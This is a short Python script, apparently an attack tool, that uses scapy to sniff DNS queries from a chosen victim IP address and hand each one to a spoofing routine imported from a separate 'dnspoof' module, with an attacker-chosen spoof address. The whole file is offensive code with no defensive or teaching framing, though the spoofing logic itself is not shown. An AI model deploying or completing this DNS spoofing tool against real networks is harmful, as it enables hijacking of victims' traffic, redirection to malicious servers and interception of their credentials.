#!/usr/bin/python
from scapy.all import *
import sys
from dnspoof import *


def print_pkts(pkts):
    pkts.show()


def snuffle(int1, victimIP, spoofIP):
    dnsfilter = " and ".join([
        "udp dst port 53",
        "src host " + victimIP
    ])

    dnsfil2r = "udp dst port 53"

    sniff(filter=dnsfilter, prn=dspoof(spoofIP, int1), store=0, iface=int1)
